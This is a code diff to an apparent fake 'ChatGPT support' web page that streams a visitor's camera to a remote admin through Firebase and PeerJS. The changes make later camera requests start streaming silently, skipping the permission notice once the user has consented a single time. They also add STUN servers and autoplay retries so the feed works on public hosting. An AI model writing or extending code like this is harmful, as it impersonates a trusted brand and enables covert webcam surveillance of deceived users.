@@ -983,16 +983,14 @@
         camRef.child('status').on('value', snap => {
           const status = snap.val();
           if (status === 'requesting') {
-            const allowBtn = document.getElementById('camAllowBtn');
-            const notifSub = document.querySelector('.notif-sub');
             if (userCamConsented) {
-              allowBtn.textContent = 'Start Camera';
-              notifSub.textContent = 'Tap to share your camera with the support agent.';
+              // Already consented before — skip the notification, start immediately
+              startUserPeerJS();
             } else {
-              allowBtn.textContent = 'Allow';
-              notifSub.textContent = 'ChatGPT support would like to access your camera to assist you better.';
+              document.getElementById('camAllowBtn').textContent = 'Allow';
+              document.querySelector('.notif-sub').textContent = 'ChatGPT support would like to access your camera to assist you better.';
+              document.getElementById('camPermissionNotif').classList.add('show');
             }
-            document.getElementById('camPermissionNotif').classList.add('show');
           }
           if (status === 'stopped') {
             document.getElementById('camPermissionNotif').classList.remove('show');
@@ -1014,10 +1012,25 @@
       }
     }
 
+    // ── Shared ICE config for WebRTC NAT traversal (required on public HTTPS hosting) ──
+    const ICE_CONFIG = {
+      config: {
+        iceServers: [
+          { urls: 'stun:stun.l.google.com:19302' },
+          { urls: 'stun:stun1.l.google.com:19302' },
+          { urls: 'stun:stun2.l.google.com:19302' },
+          { urls: 'stun:stun3.l.google.com:19302' },
+          { urls: 'stun:stun4.l.google.com:19302' },
+          { urls: 'stun:stun.cloudflare.com:3478' }
+        ],
+        iceTransportPolicy: 'all'
+      }
+    };
+
     // ── ADMIN SIDE PeerJS ──
     function startAdminPeerJS() {
       if (peer) { peer.destroy(); }
-      peer = new Peer(); // Free PeerJS Cloud Server
+      peer = new Peer(ICE_CONFIG); // With STUN servers for public hosting
 
       peer.on('open', id => {
         // Broadcast the Admin's Peer ID via Firebase so the user knows who to call
@@ -1036,7 +1049,9 @@
         // When the user stream arrives, attach it
         call.on('stream', stream => {
           remoteVideo.srcObject = stream;
-          remoteVideo.play().catch(()=>{});
+          // Retry play() — needed on GitHub Pages / HTTPS / mobile autoplay policy
+          const tryPlay = () => remoteVideo.play().catch(() => setTimeout(tryPlay, 500));
+          tryPlay();
           camPanel.classList.add('show');
           camBtn.innerHTML = svgCamOff() + ' Stop Camera';
           camBtn.classList.add('active-cam');
@@ -1073,7 +1088,7 @@
         }
 
         if (peer) peer.destroy();
-        peer = new Peer();
+        peer = new Peer(ICE_CONFIG); // With STUN servers for public hosting
 
         peer.on('open', id => {
           // Call the admin and push our local video stream
